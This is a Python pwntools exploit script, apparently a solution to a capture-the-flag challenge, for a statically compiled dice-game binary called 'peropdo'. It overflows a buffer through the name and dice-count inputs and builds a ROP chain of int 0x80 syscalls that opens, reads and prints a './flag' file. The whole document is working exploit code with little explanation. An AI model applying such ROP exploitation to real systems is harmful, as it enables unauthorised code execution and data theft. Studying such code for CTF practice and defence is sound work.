from pwn import *

#This binary was compiled static!!
#Dice number : 23 setting => not 'y' => segment falut(overflow)
#Name buf can`t be pushed 0xb
	#=>ex) 0x080b1234 (x) Not pushed!!
#*(&v7 + v1++) = sub_804F0B0(); => v7 variable will be input not limited

'''
char v5; // [esp+1Bh] [ebp-1h]
int number; // [esp+1Ch] [ebp+0h]
int v7; // [esp+20h] [ebp+4h]
'''

#Because the value stored in variable v7 is random, brute forcing is required.

context.log_level='debug'

def Name(name):
	s.recvuntil('What is your name?')
	s.sendline(name)

def Dice(number,ans):
	s.recvuntil('How many dice would you like to roll?')
	s.sendline(str(number))
	s.recvuntil('Would you like to play again?')
	s.sendline(ans)

if __name__ == "__main__":

	s=process('./peropdo')

	name_buf=0x80ECFC0
	seed_starting=0x80ecff1
	pop_ecx_ret=0x80e5ee1
	pop_eax_ret=0x080e558a
	pop_ebx_ret=0x80481c9
	pop_edx_ret=0x806f2fa


	'''
	seed value: 76200282
	number[22]: 80ecfed
	'''

	seed=76200282	#Starting point of name buffer is 0x80ECFC0


	flag='./flag\x00' #0x80ECFC4
	nopslop='\x90'*(seed_starting-name_buf-len(flag)*2-1)
	
	ebp=p32(seed_starting)
	int_0x80=p32(0x0806fae0) #ret

        shellcode=p32(pop_ecx_ret)
        shellcode+=p32(0x0)
	shellcode+=p32(pop_eax_ret)
	shellcode+=p32(0x5)
	shellcode+=p32(pop_ebx_ret)
	shellcode+=p32(0x80ECFC4)
	shellcode+=p32(pop_edx_ret)
	shellcode+=p32(0x1) 
	shellcode+=int_0x80
	
	shellcode+=p32(pop_ebx_ret)
	shellcode+=p32(0x3)
        shellcode+=p32(pop_ecx_ret)
        shellcode+=p32(0x80ecfb0) #buf
        shellcode+=p32(pop_eax_ret)
        shellcode+=p32(0x3)
        shellcode+=p32(pop_edx_ret)
        shellcode+=p32(0x64)
        shellcode+=int_0x80

	shellcode+=p32(pop_eax_ret)
	shellcode+=p32(0x4)
	shellcode+=p32(pop_ebx_ret)
	shellcode+=p32(0x1)
	shellcode+=p32(pop_ecx_ret)
	shellcode+=p32(0x80ecfb0)
	shellcode+=p32(pop_edx_ret)
	shellcode+=p32(0x64)
	shellcode+=int_0x80

	payload=p32(seed)+flag+nopslop+ebp+shellcode

	Name(payload)

	Dice(23,'n')
	s.recv(1024)

	s.interactive()
		
